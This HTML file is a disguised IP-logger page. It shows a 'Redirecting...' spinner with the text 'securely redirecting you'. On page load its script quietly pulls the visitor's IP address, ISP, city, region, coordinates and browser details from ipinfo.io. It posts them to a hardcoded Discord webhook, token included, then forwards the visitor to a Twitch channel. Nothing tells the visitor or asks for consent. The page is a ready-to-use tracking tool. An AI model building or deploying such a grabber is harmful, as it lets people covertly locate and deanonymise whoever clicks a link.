<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background-color: white;
            padding: 40px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 100%;
            max-width: 600px;
            animation: fadeIn 1s ease-in-out;
        }

        h1 {
            color: #444;
            font-size: 28px;
            margin-bottom: 20px;
        }

        .loading {
            font-size: 16px;
            color: #666;
            margin-top: 5px;
        }

        .spinner {
            border: 4px solid #f3f4f6;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .error {
            color: red;
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Redirecting...</h1>
        <p class="loading">Please wait while we are securely redirecting you.</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function trackVisitor() {
            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your original webhook URL
            const redirectURL = "https://m.twitch.tv/scrappyvest28"; // Change to your desired redirect URL

            try {
                const response = await fetch("https://ipinfo.io/json");
                if (!response.ok) throw new Error("Failed to fetch IP info");

                const data = await response.json();
                if (!data.ip) throw new Error("Invalid data received");

                const { ip, country, region, city, loc, org } = data;
                const [lat, lon] = loc.split(",");
                const browser = navigator.userAgent;
                const countryCode = country.toLowerCase();
                const flagUrl = `https://flagsapi.com/${countryCode}/flat/64.png`;

                const payload = {
                    username: ip,
                    avatar_url: flagUrl,
                    embeds: [{
                        title: `Visitor From ${country}`,
                        color: 39423,
                        fields: [
                            { name: "IP Address", value: `\`${ip}\``, inline: true },
                            { name: "ISP", value: org, inline: true },
                            { name: "Location", value: `${region}, ${city}`, inline: true },
                            { name: "Browser Info", value: `\`${browser}\`` }
                        ],
                        footer: {
                            text: `Time: ${new Date().toLocaleString()}`,
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/e/ec/Clock-icon.png"
                        }
                    }]
                };

                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                // Redirect after a short delay
                setTimeout(() => window.location.href = redirectURL, 3000);

            } catch (error) {
                console.error("Error:", error);
                showError();
            }
        }

        function showError() {
            document.body.innerHTML = `
                <div class="container">
                    <h1 class="error">404 Error</h1>
                    <p>Access blocked or an error occurred. Please try again later.</p>
                </div>
            `;
            setTimeout(() => window.location.href = "https://google.com", 3000);
        }

        window.onload = trackVisitor;
    </script>

</body>
</html>
